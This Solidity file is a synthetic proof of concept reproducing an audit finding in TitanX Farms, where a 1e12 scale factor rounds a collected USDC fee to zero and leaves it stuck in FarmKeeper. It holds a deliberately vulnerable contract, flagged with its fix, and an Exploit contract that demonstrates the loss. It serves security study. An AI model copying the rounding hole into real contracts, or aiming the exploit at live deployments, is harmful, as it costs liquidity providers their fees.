// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  TitanX Farms — fee-per-share rounds a collected USDC fee down to 0
    (Pashov, #41859, H-01).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: FarmKeeper._collectFees adds
    mulDiv(amount, SCALE_FACTOR, liquidity) with SCALE_FACTOR = 1e12.
    For a 6-decimal token, amount 1e6 and liquidity 2e18 (the report's
    "liquidity > 1e18" case): 1e6 * 1e12 / 2e18 = 0. The USDC is pulled
    into the keeper and the LP's claim stays 0. The same inputs with
    SCALE_FACTOR 1e18 pay the LP the full 1e6.

    The else branch is the audited line. updateFarm is permissionless,
    so anyone can force the collection.

    Repo: dragon-software-devs/TitanX-Farms @ 181af1ffd7a8bcfe57c0bdeadccabf1b709619a9
    FarmKeeper._collectFees. */

contract USDCToken {
    string public name = "USD Coin";
    string public symbol = "USDC";
    uint8 public constant decimals = 6;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Pool {
    function approve(USDCToken token, address spender, uint256 amount) external {
        token.approve(spender, amount);
    }
}

contract FarmKeeper {
    /// Audited Constants.SCALE_FACTOR.
    uint256 public constant SCALE_FACTOR = 1e12;

    USDCToken public usdc;
    address public pool;
    uint256 public liquidity;
    bool public isInputToken0;
    uint256 public accFeePerShareForToken0;
    uint256 public lastAccrual;
    uint256 public lastClaim;

    constructor(USDCToken _usdc, address _pool) {
        usdc = _usdc;
        pool = _pool;
        liquidity = 2e18;
    }

    function setInputToken(bool isInput) external {
        isInputToken0 = isInput;
    }

    /// Math.mulDiv floor. The audited call is mulDiv(amount, SCALE_FACTOR, liquidity).
    function mulDiv(uint256 a, uint256 b, uint256 c) public pure returns (uint256) {
        return (a * b) / c;
    }

    /// Permissionless, matching updateFarm -> _collectFees.
    function collectFees(uint256 amount0) external {
        usdc.transferFrom(pool, address(this), amount0);
        if (isInputToken0) {
            lastAccrual = amount0;
        } else {
            // @> VULN: 1e6 * 1e12 / 2e18 rounds to 0, so the collected fee is not credited to LPs
            accFeePerShareForToken0 += mulDiv(amount0, SCALE_FACTOR, liquidity);
            // FIX: SCALE_FACTOR = 1e18. Then 1e6 * 1e18 / 2e18 = 5e5, and the LP claim returns 1e6.
        }
    }

    /// LP owns the whole position. pending = liquidity * acc / SCALE.
    function claim() external returns (uint256 paid) {
        paid = liquidity * accFeePerShareForToken0 / SCALE_FACTOR;
        lastClaim = paid;
        if (paid > 0) {
            usdc.transfer(msg.sender, paid);
        }
    }
}

contract Exploit {
    uint256 public constant FEE = 1_000_000; // 1 USDC
    uint256 public constant LIQUIDITY = 2e18;

    USDCToken public usdc; // nonce 1
    Pool public pool; // nonce 2
    FarmKeeper public keeper; // nonce 3

    uint256 public profit;
    uint256 public accrual;
    uint256 public claimed;
    uint256 public stuck;
    uint256 public shortfall;

    constructor() {
        usdc = new USDCToken();
        pool = new Pool();
        keeper = new FarmKeeper(usdc, address(pool));
        usdc.mint(address(pool), FEE);
    }

    function run() external {
        keeper.setInputToken(false);
        pool.approve(usdc, address(keeper), FEE);
        uint256 quote = keeper.mulDiv(FEE, keeper.SCALE_FACTOR(), LIQUIDITY);
        require(quote == 0, "quote did not round to 0");
        keeper.collectFees(FEE);
        accrual = keeper.accFeePerShareForToken0();
        require(accrual == 0, "fee was credited");
        claimed = keeper.claim();
        stuck = usdc.balanceOf(address(keeper));
        shortfall = FEE - claimed;
        require(claimed == 0, "LP was paid");
        require(stuck == FEE, "fee not stuck");
        require(shortfall == FEE, "shortfall");
        require(usdc.balanceOf(address(pool)) == 0, "pool still holds the fee");
        profit = stuck;
    }
}
